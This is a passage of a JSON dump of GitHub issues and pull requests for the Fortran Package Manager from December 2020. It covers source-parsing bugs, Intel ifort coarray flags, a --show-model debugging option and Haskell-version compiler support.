                    "text": "It seems more consistent to me to have run [--test|--benchmark|-example|--app] and have corresponding directories test/, benchmark/, example/, and app/ as special pre-defined directories\n\nI think this is very similar to the design that cargo and stack ended up with. I'd have to double check to be sure. So basically:\n\nfpm run implies fpm run --app\nfpm test implies fpm run --test"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-15 16:21:25+00:00",
                    "text": "Internally basically test is a special case of run;  unless that is going to change that simplifies documentation and usage.\nThe question is whether anyone wants the commands to diverge. In some other packages test is totally different than run and implies the use of a specific testing framework, in others it is an alias for run with a switch, as proposed and as is (currently) true in fpm.  So currently now you read about the run command and then read about the test command and there is no difference except which list of executables they select, based on the directory the tests are in or the categories they have been placed in (executable or test) in the TOML manifest. If the documentation is largely redundant it seems the command is too, except that those options are so commonly used they deserve an abbreviation.\nSo does anyone intend test to become a completely different beast?  I find it does what I want in its current form."
                }
            ]
        },
        {
            "number": 304,
            "user": "awvwgk",
            "date": "2020-12-12 11:01:33+00:00",
            "title": "Remove note on not supported dependencies in program targets",
            "text": "Related #228\nFixed by #266",
            "comments": []
        },
        {
            "number": 303,
            "user": "LKedward",
            "date": "2020-12-12 10:50:08+00:00",
            "title": "Fixes to source parsing",
            "text": "Fixes #264, issue in source parsing where assignment statements with variables called program or module will be incorrectly detected as program and module declaration statements.\n(Package vegetables now works with fortran fpm.)\n\n\nFixes #301, issue caused by empty source files. Empty source files are detected and not processed any further.\n(Package M_system now works)",
            "comments": []
        },
        {
            "number": 301,
            "user": "urbanjost",
            "date": "2020-12-12 05:06:33+00:00",
            "title": "Getting tracebacks for some fpm builds",
            "text": "With some larger projects with large fpm.toml files I get a blank string passed to a routine that assumes it never gets a blank. It is easy to test for zero length but have not tracked down why it is passing a blank string. Only shows if use the debug version, does not produce erroneous output if not checking for array bounds (ie. use the release version) that I have detected. This one is from M_system.\n$ ffpm build\nAt line 88 of file ././src/fpm_strings.f90\nFortran runtime error: Index '1' of dimension 1 of array 'input' above upper bound of 0\n\nError termination. Backtrace:\n#0  0x7f9e82a4e131 in ???\n#1  0x7f9e82a4ecd9 in ???\n#2  0x7f9e82a4f0bb in ???\n#3  0x44a8be in __fpm_strings_MOD_fnv_1a_string_t\n        at ././src/fpm_strings.f90:88\n#4  0x502805 in __fpm_source_parsing_MOD_parse_f_source\n        at ././src/fpm_source_parsing.f90:89\n#5  0x446229 in parse_source\n        at ././src/fpm_sources.f90:29\n#6  0x43d55a in __fpm_sources_MOD_add_sources_from_dir\n        at ././src/fpm_sources.f90:93\n#7  0x423a6e in __fpm_MOD_build_model\n        at ././src/fpm.f90:91\n#8  0x41d34f in __fpm_MOD_cmd_build\n        at ././src/fpm.f90:191\n#9  0x4019d8 in MAIN__\n        at app/main.f90:25\n#10  0x401ae0 in main\n        at app/main.f90:9",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-12 07:40:57+00:00",
                    "text": "Thanks for reporting, I tracked it down to an empty source file in M_time. Removing this file from M_time and updating your dependency tree should resolve the issue.\nThis also raises the question how fpm should deal with this kind of input. An empty source file is usually invalid input for a Fortran compiler, but certainly there should be no runtime error in fpm."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-12 10:33:29+00:00",
                    "text": "Thanks for reporting @urbanjost. An easy fix is for fpm to ignore such files by not generating any targets for them."
                }
            ]
        },
        {
            "number": 300,
            "user": "urbanjost",
            "date": "2020-12-12 02:37:34+00:00",
            "title": "Remove -coarray=single option from ifort compiler default options",
            "text": "With the intel compiler ifort(1) use of the -coarray=single creates\nan executable with images instead of just allowing the coarray\nsyntax as with the GNU gfortran compiler so it is being removed as\na default option and will be implemented via a more general option\nallowing for user-specified compiler options. As it is, use of the\noption requires developer platforms to support auxiliary libraries\nnot always available, and coarray does not appear to be on all\nplatforms supported by ifort (e.g. MacOS).\n2020-12-11",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-12-12 02:40:20+00:00",
                    "text": "This addresses issues raised in # #283 by removing the -coarray=single switch from the ifort debug and release compiler options.\nJust two lines are deleted."
                }
            ]
        },
        {
            "number": 294,
            "user": "LKedward",
            "date": "2020-12-10 15:53:34+00:00",
            "title": "Add: support for detecting .f and .F files",
            "text": "This PR should allow some legacy projects to compile with some restructuring.\nI've tested this successfully on minpack (mentioned in #107) and @ivan-pi's fortran-lsp (mentioned in #250).\nThis PR adds no internal logic for distinguishing fixed and free-form (#250), this is still left to the compiler.\nResolves: #107\nRelated: #250",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-14 17:53:35+00:00",
                    "text": "Thanks for reviewing, I'll merge now."
                }
            ]
        },
        {
            "number": 293,
            "user": "LKedward",
            "date": "2020-12-10 15:35:03+00:00",
            "title": "Fix: missing error check after `new_package` call",
            "text": "Fixes silent failure due to invalid manifest keys when apply_defaults=.true.",
            "comments": []
        },
        {
            "number": 292,
            "user": "certik",
            "date": "2020-12-09 20:42:01+00:00",
            "title": "Specify the correct help for `fpm run -h`",
            "text": "This is just a typo that looks like have been overlooked.",
            "comments": []
        },
        {
            "number": 291,
            "user": "certik",
            "date": "2020-12-09 20:40:24+00:00",
            "title": "Initial implementation of `fpm build --show-model`",
            "text": "It prints a human readable representation of the Model. An example:\n$ fpm build --show-model\n(fpm [(app/main.f90 fpm 3 .false. ...) (test/cli_test/cli_test.f90 cli-test 4 .false. ...) (test/fpm_test/main.f90 fpm-test 4 .false. ...) (test/fpm_test/test_backend.f90 \"\" 4 .false. ...) (test/fpm_test/test_manifest.f90 \"\" 4 .false. ...) (test/fpm_test/test_module_dependencies.f90 \"\" 4 .false. ...) (test/fpm_test/test_source_parsing.f90 \"\" 4 .false. ...) (test/fpm_test/testsuite.f90 \"\" 4 .false. ...) (test/fpm_test/test_toml.f90 \"\" 4 .false. ...) (test/fpm_test/test_versioning.f90 \"\" 4 .false. ...) (test/help_test/help_test.f90 help-test 4 .false. ...) (test/new_test/new_test.f90 new-test 4 .false. ...) (./src/fpm_backend.f90 \"\" 1 .false. ...) (./src/fpm_command_line.f90 \"\" 1 .false. ...) (./src/fpm_compiler.f90 \"\" 1 .false. ...) (./src/fpm_environment.f90 \"\" 1 .false. ...) (./src/fpm.f90 \"\" 1 .false. ...) (./src/fpm_filesystem.f90 \"\" 1 .false. ...) (./src/fpm_model.f90 \"\" 1 .false. ...) (./src/fpm_sources.f90 \"\" 1 .false. ...) (./src/fpm_strings.f90 \"\" 1 .false. ...) (./src/fpm_targets.f90 \"\" 1 .false. ...) (./src/fpm/error.f90 \"\" 1 .false. ...) (./src/fpm/git.f90 \"\" 1 .false. ...) (./src/fpm/manifest.f90 \"\" 1 .false. ...) (./src/fpm/toml.f90 \"\" 1 .false. ...) (./src/fpm/versioning.f90 \"\" 1 .false. ...) (./src/fpm/cmd/new.f90 \"\" 1 .false. ...) (./src/fpm/manifest/build.f90 \"\" 1 .false. ...) (./src/fpm/manifest/dependency.f90 \"\" 1 .false. ...) (./src/fpm/manifest/executable.f90 \"\" 1 .false. ...) (./src/fpm/manifest/library.f90 \"\" 1 .false. ...) (./src/fpm/manifest/package.f90 \"\" 1 .false. ...) (./src/fpm/manifest/test.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/all.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/build.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/constants.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/datetime.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/de.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/error.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/ser.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/structure.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/type.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/utils.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/version.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/build/array.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/build/keyval.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/build/merge.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/build/table.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/de/character.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/de/tokenizer.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/structure/base.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/structure/vector.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/type/array.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/type/keyval.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/type/table.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/type/value.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/utils/convert.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/utils/verify.f90 \"\" 1 .false. ...) (build/dependencies/M_CLI2/src/M_CLI2.f90 \"\" 1 .false. ...)] ...)\n\nIt doesn't yet convert all of the model (it prints ... for things it skips), but it gives an idea how it would look like. Let me know if this approach looks good and I should finish printing all of the model in the same way.\nThe motivation for this feature is to be able to more easily learn and debug fpm's internals, and learn how to write a new backend.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-12-09 20:51:59+00:00",
                    "text": "Few questions:\n\nWhat can you do with this?\nIs it for users or developers or both?\nDoes this command also build the code or only prints the model? If the latter, I don't think it should be called fpm build but something else. Maybe without any subcommand, i.e. fpm --show-model?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-10 13:53:44+00:00",
                    "text": "Given that users of this functionality are unlikely to be familiar with the types and their components, I would suggest adding that information in as well. It may also be beneficial to \"pretty-print\" the output to make it more readable. For example, I have typically used the following pattern when implementing similar functionality. It makes for (nearly) valid Fortran code. They are also easily composed.\ntype_name_t(\n    component_1 = \"something\",\n    component_2 = 43,\n    component_3 = another_type_t(\n        my_component = 3.14,\n        an_array = [\n            1,\n            3,\n        ]\n    )\n)"
                },
                {
                    "user": "certik",
                    "date": "2020-12-11 16:29:27+00:00",
                    "text": "I can use the format Brad suggested. This does not do any building just showing the comment. It is for developers mainly, but also for users if they want to see what exactly is the \"state\" that fpm sees, and if fpm picked up their files and setup correctly.\nHopefully that answers the question.\nThe only reason I used this syntax is that I converged to it for LFortran, initially I used the syntax that @everythingfunctional suggested. And it quickly turns out into pages and pages of output, which makes it very hard to see anything. However, the actual syntax is relatively easy to change, so if most people prefer the verbose syntax, I will implement it. For me the most important thing is to have this in, so that I can write the cmake backend.\nI have initially created a new command for this. Then I noticed the --list`` in build`, so I just did what was consistent. I can revert it and create a new command again."
                },
                {
                    "user": "certik",
                    "date": "2020-12-22 23:26:44+00:00",
                    "text": "Here is how it looks now:\n:/tmp$ ~/repos/fpm/fpm/build/gfortran_debug/app/fpm new xx1\n + mkdir -p xx1\n + cd xx1\n + mkdir -p xx1/src\n + mkdir -p xx1/test\n + mkdir -p xx1/app\n + git init xx1\nInitialized empty Git repository in /tmp/xx1/.git/\n:/tmp$ cd xx1/\n:/tmp/xx1(master)$ ~/repos/fpm/fpm/build/gfortran_debug/app/fpm build --show-model\n + mkdir -p build/dependencies\n fpm_model_t(package_name=\"xx1\", sources=[srcfile_t(file_name=\"app/main.f90\", exe_name=\"xx1\", unit_scope=3, modules_provided=[], unit_type=1, modules_used=[\"xx1\"], include_dependencies=[], link_libraries=[], digest=5224574535640112330), srcfile_t(file_name=\"test/main.f90\", exe_name=\"runTests\", unit_scope=4, modules_provided=[], unit_type=1, modules_used=[], include_dependencies=[], link_libraries=[], digest=-1967706312983338614), srcfile_t(file_name=\"././src/xx1.f90\", exe_name=\"\", unit_scope=1, modules_provided=[\"xx1\"], unit_type=2, modules_used=[], include_dependencies=[], link_libraries=[], digest=-2717113435056925080)], targets=[build_target_t(output_file=\"build/gfortran_debug/xx1/libxx1.a\", source=(), dependencies=[build_target_t(...)], target_type=2, link_libraries=[], link_objects=[\"build/gfortran_debug/xx1/src_xx1.f90.o\"], touched=.false., sorted=.false., skip=.false., schedule=-1, digest_cached=()), build_target_t(output_file=\"build/gfortran_debug/xx1/app_main.f90.o\", source=srcfile_t(file_name=\"app/main.f90\", exe_name=\"xx1\", unit_scope=3, modules_provided=[], unit_type=1, modules_used=[\"xx1\"], include_dependencies=[], link_libraries=[], digest=5224574535640112330), dependencies=[build_target_t(...)], target_type=3, link_libraries=[], link_objects=[], touched=.false., sorted=.false., skip=.false., schedule=-1, digest_cached=()), build_target_t(output_file=\"build/gfortran_debug/app/xx1\", source=(), dependencies=[build_target_t(...), build_target_t(...)], target_type=1, link_libraries=[], link_objects=[\"build/gfortran_debug/xx1/app_main.f90.o\"], touched=.false., sorted=.false., skip=.false., schedule=-1, digest_cached=()), build_target_t(output_file=\"build/gfortran_debug/xx1/test_main.f90.o\", source=srcfile_t(file_name=\"test/main.f90\", exe_name=\"runTests\", unit_scope=4, modules_provided=[], unit_type=1, modules_used=[], include_dependencies=[], link_libraries=[], digest=-1967706312983338614), dependencies=[], target_type=3, link_libraries=[], link_objects=[], touched=.false., sorted=.false., skip=.false., schedule=-1, digest_cached=()), build_target_t(output_file=\"build/gfortran_debug/test/runTests\", source=(), dependencies=[build_target_t(...), build_target_t(...)], target_type=1, link_libraries=[], link_objects=[\"build/gfortran_debug/xx1/test_main.f90.o\"], touched=.false., sorted=.false., skip=.false., schedule=-1, digest_cached=()), build_target_t(output_file=\"build/gfortran_debug/xx1/src_xx1.f90.o\", source=srcfile_t(file_name=\"././src/xx1.f90\", exe_name=\"\", unit_scope=1, modules_provided=[\"xx1\"], unit_type=2, modules_used=[], include_dependencies=[], link_libraries=[], digest=-2717113435056925080), dependencies=[], target_type=3, link_libraries=[], link_objects=[], touched=.false., sorted=.false., skip=.false., schedule=-1, digest_cached=())], fortran_compiler=\"gfortran\", fortran_compile_flags=\" -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -fcoarray=single  -J build/gfortran_debug/xx1 -I build/gfortran_debug/xx1\", link_flags=\"\", library_file=\"build/gfortran_debug/xx1/libxx1.a\", output_directory=\"build/gfortran_debug\", link_libraries=[], deps=dependency_tree_t(...))\n\nWhile doing this I discovered several problems that I do not want to fix as part of this PR, but rather address in future PRs once this is merged (I'll create separate issues for each of these later):\n\nIn order to introduce a new command fpm show as in 6eef114 runs into a problem as in 1875088 that fpm_show_settings cannot be passed into call build_model(model, settings, package, error) which expects fpm_build_settings and it didn't work even if I subclassed fpm_build_settings with fpm_show_settings. So for now I am just going to implement an fpm build --show-model option, and later we can port it to a standalone command if somebody figures out how to do it.\nbuild_target_t%dependencies(:) points to itself recursively and thus cannot be printed due to infinite recursion. Not sure what is going on, but for now I just print ... in the inner build_target_t and we can investigate and fix this later.\nfpm_model_t%deps is of type dependency_tree_t which is defined outside of the Model. That is not a clean design, rather we need to port it to be fully defined and self sufficient inside the fpm_model.f90 file.\nParts of the build_target_t should probably go to the default backend, not be in the Model, because other backends, such as the cmake backend does not need all of that information, such as the link_objects=[\"build/gfortran_debug/xx1/test_main.f90.o\"], the cmake backend lets cmake figure it out. It only needs to know what the build targets are and what the source dependencies are, so the sources are ok to stay in Model I think.\ntouched=.false. should probably go into the backend also, for example the Make or CMake backend will handle this themselves --- although we need to rescan to see if dependencies changed, in which case the Model would change also.\nSome of the allocatable arrays are not allocated (!). Instead I propose to allocate them to zero length, so that you can loop over it with a simple loop without the need to check for the allocatable status.\nThe srcfile_t are repeated for the same file several times, as they are first part of the package, and then part of the build targets. Is there a way to design this so that things do not repeat? Multiple targets can share a file, so it seems it's a matter of how to best print this, so that things are not repeated all the time.\n\nSo besides these issues the PR now works and all comments should be addressed. I am proposing to merge it as is."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-22 23:40:32+00:00",
                    "text": "In order to introduce a new command fpm show as in 6eef114 runs into a problem as in 1875088 that fpm_show_settings cannot be passed into call build_model(model, settings, package, error) which expects fpm_build_settings and it didn't work even if I subclassed fpm_build_settings with fpm_show_settings. So for now I am just going to implement an fpm build --show-model option, and later we can port it to a standalone command if somebody figures out how to do it.\n\n\nSo far passing setting%fpm_build_settings was used for other commands that require the build:\n\n  \n    \n      fpm/fpm/src/fpm.f90\n    \n    \n         Line 230\n      in\n      5ab3daf\n    \n    \n    \n    \n\n        \n          \n           call build_model(model, settings%fpm_build_settings, package, error) \n        \n    \n  \n\n\nNot optimal, accepting a class(fpm_build_settings) might be the preferable solution here.\n\n\nfpm_model_t%deps is of type dependency_tree_t which is defined outside of the Model. That is not a clean design, rather we need to port it to be fully defined and self sufficient inside the fpm_model.f90 file.\n\n\nThanks for the feedback on this. The dependency_tree_t type is implemented self-contained in the fpm_dependency module with the fpm_model_t using it as a way to represent dependencies. Also, the dependency tree can exist on its own outside of the model, like in the update command. What is the scheme you would prefer here?"
                },
                {
                    "user": "certik",
                    "date": "2020-12-22 23:45:24+00:00",
                    "text": "Thanks for the feedback on this. The dependency_tree_t type is implemented self-contained in the fpm_dependency module with the fpm_model_t using it as a way to represent dependencies. Also, the dependency tree can exist on its own outside of the model, like in the update command. What is the scheme you would prefer here?\n\nWhy not move it to fpm_model.f90 since it is already self contained? Then if the dependency tree needs to exists on its own, you just construct it on its own, but you use it from fpm_model."
                },
                {
                    "user": "certik",
                    "date": "2020-12-22 23:52:07+00:00",
                    "text": "ondrej.mp4"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-22 23:55:09+00:00",
                    "text": "@certik Let's defer the discussion around the fpm_dependency and fpm_model module relation to keep this PR on topic. I sense this could lead to bigger design decisions around the structuring of fpm."
                },
                {
                    "user": "certik",
                    "date": "2020-12-22 23:58:13+00:00",
                    "text": "@awvwgk yes, in fact most of the issues I found will lead to a bigger discussion, so I simply want to have this PR in, so that I can start developing the cmake backend, and we can figure those out later. I will also open up a dedicated issue for each."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-23 11:03:55+00:00",
                    "text": "...fpm_show_settings cannot be passed into call build_model(model, settings, package, error) which expects fpm_build_settings ...\n\nI'm unsure why this can't be implemented in the same way as the other commands or why the current implementation is 'not optimal', however I'm happy to pursue this in a separate PR.\n\n... build_target_t%dependencies(:) points to itself recursively and thus cannot be printed due to infinite recursion.\n\nmodel%targets is a flat structure containing all build targets, where target dependencies are pointers back into model%targets. This allows us to exploit allocatable arrays (and their cleanup) instead of allocating pointers directly. Because of this, you do not need to recurse over this structure to print it completely - for each target you only need to print a shortened representation of its dependencies (e.g. object file name).\nThere shouldn't be any infinite recursion as that would imply a dependency cycle.\n\n\nfpm_model_t%deps is of type dependency_tree_t which is defined outside of the Model\n\n\nIt seems to me that deps doesn't need to be in the model. @awvwgk is deps only required for fetching and resolving dependencies before model construction or is it also required after model construction for the custom backends? If it is not required after model construction then presumably it can be separated from the model type?\n\n\nThe srcfile_t are repeated for the same file several times, as they are first part of the package, and then part of the build targets. Is there a way to design this so that things do not repeat? Multiple targets can share a file, so it seems it's a matter of how to best print this, so that things are not repeated all the time.\n\n\nAgain since all source files are in model%sources, then when printing a build target only a short representation of the corresponding source file should be printed (e.g. source file name).\nRegarding your remaining points @certik, it seems that separating the build_target_t type and the model%targets array from the model might be a good idea for the near term. I'm happy to start work on this."
                },
                {
                    "user": "certik",
                    "date": "2020-12-23 16:42:24+00:00",
                    "text": "Thanks @LKedward. There is a lot to improve in all this, but my time is limited, and I feel having something in is better than nothing. We can all collectively improve things once this is in. I only have time to do the small things you pointed out, so I am going to do it now, and then if we merge it, others can easily fix some of the other stuff. The indentation of the output would be great, but it's a bit tricky, as you have to rework how you pass things: as lists of strings and tracking the indentation level. I have done that in LFortran but it's some work, so I would prefer to do it later, I don't have time to implement that right now."
                },
                {
                    "user": "certik",
                    "date": "2020-12-23 17:17:40+00:00",
                    "text": "@LKedward I implemented everything except string_cat, which I tried in certik@788ac77, but realized that it removes the \" from around the strings, and I really want that in the output around strings to make it clear it is a string (and also if there are spaces or commas in the path). So I reverted it."
                },
                {
                    "user": "certik",
                    "date": "2020-12-24 01:09:03+00:00",
                    "text": "Per @milancurcic's request:\n\n  \n    \n    ondrej2.mp4"
                }
            ]
        },
        {
            "number": 290,
            "user": "awvwgk",
            "date": "2020-12-09 20:14:23+00:00",
            "title": "Add automatic program discovery in Haskell version",
            "text": "Once projects start to rely on the automatic program discovery of Fortran fpm the packages will not correctly build with Haskell version. For some of my projects I currently have to disable the automatic discovery and cannot add test because the Haskell and Fortran version behave differently when dealing with multiple programs in the same source directory.",
            "comments": []
        },
        {
            "number": 289,
            "user": "everythingfunctional",
            "date": "2020-12-09 20:12:39+00:00",
            "title": "Add support for same compilers as Fortran version to Haskell version",
            "text": "This adds support for the same compilers as is currently in the Fortran version to the Haskell version. I would appreciate if anyone with access to these compilers to do some testing.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-12-10 00:36:26+00:00",
                    "text": "Might have left something set I did not intend to, but everyt application I build I get a warning message about MPI even in programs with no MPI calls when I use ifort; no problems with nvfortran or gfortran so far.   Does not occur with the Fortran version with same\ncompilers.  So just giving a heads-up.  If aligning the two versions I missed not being able to set a default compiler with $FPM_COMPILER as with ffpm.  I want to pull down the new OneAPI version as it is supposed to be fully f2018 and something I particularly want when doing this type of testing in particular is the intrinsic  COMPILER_OPTIONS(); which this version of ifort does not have.  Still testing but except for this message ifort, nvfortran, and gfortran look good on a Red Hat 8 box.\n\n M_calculator]$ fpm run --compiler ifort\n[0] MPI startup(): I_MPI_CAF_RUNTIME environment variable is not supported.\n[0] MPI startup(): Similar variables:\n         I_MPI_THREAD_RUNTIME\n[0] MPI startup(): To check the list of supported variables, use the impi_info utility or refer to https://software.intel.com/en-us/mpi-library/documentation/get-started.\n Enter expressions or \"funcs\" or \"dump\"\n\nerror===>*calculator* input line was empty\n3/4\n0.75 = 3/4\n.\n[urbanjs@localhost M_calculator]$ ifort --version\nifort (IFORT) 19.1.3.304 20200925\nCopyright (C) 1985-2020 Intel Corporation.  All rights reserved."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-10 01:31:04+00:00",
                    "text": "Thanks for testing @urbanjost . I may try out the Intel oneAPI on a Linux virtual machine soon. I haven't been very impressed with it on MacOS so far. ifx isn't available on Mac, and coarray features aren't available on Mac."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-10 11:13:01+00:00",
                    "text": "Thanks @everythingfunctional, I've also tried with Intel fortran.\nI get linker errors when using ifort (19.1.0.166, Ubuntu) with undefined references to various MPI routines.\nI think -coarray=single in ifort is not the same as -fcoarray=single in gfortran: in gfortran, the single mode links against a \"single-image library consisting of stubs\", whereas I think ifort is still generating backend code (MPI) but for just one image, hence the linker errors.\nPerhaps it's possible to link to the same caf_single stubs library with Intel, but this may not be a good solution.\nOtherwise it looks like only gfortran can support coarray code without generating a coarray executable."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-10 11:56:04+00:00",
                    "text": "Not needed for this PR, but worth noting that submodule support in Haskell fpm breaks with ifort (and possibly other compilers) due to various different smod naming conventions."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-10 14:01:57+00:00",
                    "text": "I see. That is disappointing, on both fronts. Is there proper submodule support in the Fortran version yet?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-10 16:10:52+00:00",
                    "text": "Is there proper submodule support in the Fortran version yet?\n\nYes there's support for submodules, though it's more rudimentary than the Haskell version since the implementation is ignorant of .mod/.smod files."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-10 18:11:40+00:00",
                    "text": "Ok, I'll pull the -coarray option out. Thanks for the review."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-11 02:45:19+00:00",
                    "text": "Odd. A few replies I made seem to be missing. Essentially I agree both packagers should remove coarray from the Intel compiler, especially because ifort allows users to add options in other ways, particularly with config files; although this allows users to \"corrupt\" the options used by a debug or release version.  Things have progressed enough we need a TOML-based method for specifying builds and custom options, especially for coarrays/OpenMP/MPI or we will limit what can easily be a package. The h-fpm version allows for custom make scripts which has allowed me to do special builds and link in external libraries like X11, etc. So we need a solution for the capability especially in f-fpm but I concur it has to go out of the defaults for now."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-14 14:26:44+00:00",
                    "text": "With the majority approval and nothing else appearing to be broken, I'm going to go ahead and merge."
                }
            ]
        },
        {
            "number": 288,
            "user": "awvwgk",
            "date": "2020-12-09 20:11:33+00:00",
            "title": "Add linking with native libraries to Haskell fpm",
            "text": "The link option is available in Fortran fpm and would be a valuable addition for Haskell version as well. Once the Fortran version depends on libraries like libgit2 or libcurl this would be a requirement in Haskell fpm to bootstrap the Fortran version.\nThis requires to introduce the build table and to propagate the link arguments correctly to the link line in the shake build system.",
            "comments": []
        },
        {
            "number": 287,
            "user": "certik",
            "date": "2020-12-09 19:18:42+00:00",
            "title": "Fix a typo in a comment",
            "text": "",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 19:23:18+00:00",
                    "text": "Will be fixed with #284 as well."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-10 10:12:04+00:00",
                    "text": "Closing as now fixed by #284"
                },
                {
                    "user": "certik",
                    "date": "2020-12-11 16:22:55+00:00",
                    "text": "Thanks!"
                }
            ]
        },
        {
            "number": 286,
            "user": "awvwgk",
            "date": "2020-12-09 17:51:22+00:00",
            "title": "Implement check for duplicated program names",
            "text": "check within an executable/test array for duplicate programs\nalso check that the program name is not empty or contains ascii control chars",
            "comments": []
        },
        {
            "number": 285,
            "user": "LKedward",
            "date": "2020-12-09 15:34:41+00:00",
            "title": "CI: update naming of release binaries",
            "text": "Remove 'v' prefix to version.\nUse 'haskell' instead of 'bootstrap'\n\nModified workflow has been tested in my fork.\nResolves #276",
            "comments": []
        },
        {
            "number": 284,
            "user": "LKedward",
            "date": "2020-12-09 14:41:03+00:00",
            "title": "Document model and backend for developers",
            "text": "Adds a high-level overview of the model and backend to demystify the internals of fpm for new and existing contributors\nAdds detailed documentation to individual modules and function where important\nUse pre-doc (!>) comments to be consistent with the rest of fpm",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-10 10:09:30+00:00",
                    "text": "Thanks for the review, merging."
                }
            ]
        },
        {
            "number": 283,
            "user": "LKedward",
            "date": "2020-12-09 13:37:19+00:00",
            "title": "ifort is generating threaded coarray code by default",
            "text": "I think the ifort coarray flag should be -coarray=single to match the default behaviour we have for gfortran.\nCurrently we have:\n\n  \n    \n      fpm/fpm/src/fpm_compiler.f90\n    \n    \n        Lines 139 to 144\n      in\n      6e46fba\n    \n    \n    \n    \n\n        \n          \n               case('release_ifort') \n        \n\n        \n          \n                  fflags = '& \n        \n\n        \n          \n                  & -fp-model precise& \n        \n\n        \n          \n                  & -pc 64& \n        \n\n        \n          \n                  & -align all& \n        \n\n        \n          \n                  & -coarray& \n        \n    \n  \n\n\nwhich I believe will default to generating shared-memory coarray code.\nLike OpenMP, coarrays should be enabled explicitly by a build option (#112 (comment)), except in the case of the caf compiler wrapper.",
            "comments": [
                {
                    "user": "ivan-pi",
                    "date": "2020-12-09 16:27:06+00:00",
                    "text": "This would explain the results seen here: https://fortran-lang.discourse.group/t/the-counter-intuitive-rise-of-python-in-scientific-computing/469/7?u=ivanpribec"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-09 20:12:08+00:00",
                    "text": "Well, that explains a lot. Certainly should be changed, especially since ifort has more back doors for specifying compiler switches than any other compiler I know of.  Unlike most of the others using fpm an ifort compiler user can set additional compiler flags via config files (see $IFORTCFG) relatively easily.  I tested with > 20 packages and did not catch that.  I think I will add a mini-version of his code into my QA list of fpm packages; which raises the thought of whether we should have a shared set of fpm repositories and a quick basic test of them (or do we, and I do not know about it?).  And I have ifort now; just in time for the new Intel suite to be available free.  I think just running the test with gfortran is sufficient for now.\nWith the alpha out in the wild I'd like this picked off quickly.  I cannot make a PR right now; but will in about six hours if no one else has."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-09 21:09:46+00:00",
                    "text": "I'm trying out ifort since it was just released for free, but nowhere in their help is the option -coarray mentioned, and I get the message ifort: command line warning #10006: ignoring unknown option '-coarray=single'. However, if I add the flag -warn all before it (but not after) I don't get that message. Anybody else have ideas for this?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-09 21:14:43+00:00",
                    "text": "I think I figured it out. I'm on MacOS, where apparently coarrays aren't supported.\nerror #8347: Coarray is not supported on this platform.   [SUITE_FAILED]"
                },
                {
                    "user": "jvdp1",
                    "date": "2020-12-09 21:21:25+00:00",
                    "text": "I am not aware that iort support something like -coarray=single. AFAIK -coarray only accept shared (i.e. -coarray=shared) or distributed (-coarray=distributed)\nHowever, the following could maybe do the trick:\nifort -coarray=shared -coarray-num-images=1"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-09 22:42:45+00:00",
                    "text": "At least in newer versions it should take shared|distributed|coprocessor|single on the \"Classic\" ifort. Not sure out the ifx one.  If one of them is not present it will reject coarray syntax.   =single is supposed to be for debugging where it does not actually spawn multiple images but allows the syntax,  which does not quite jive with what everyone is seeing.  Are we talking the classic or new Intel compiler?  The new distribution comes with both."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-09 22:46:19+00:00",
